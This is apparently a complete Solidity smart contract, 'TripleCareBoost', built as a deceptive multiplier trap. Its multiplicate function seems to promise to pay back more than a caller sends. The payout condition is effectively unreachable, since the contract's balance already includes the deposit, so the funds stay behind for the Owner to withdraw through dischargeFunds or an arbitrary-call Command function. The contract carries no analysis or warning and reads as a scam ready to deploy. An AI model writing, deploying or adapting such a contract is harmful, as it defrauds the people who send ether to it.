pragma solidity ^0.4.18;

contract TripleCareBoost
{
    address public Owner = msg.sender;

    function() public payable{}

    function dischargeFunds()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes info)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(info);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            adr.transfer(this.balance+msg.value);
        }
    }
}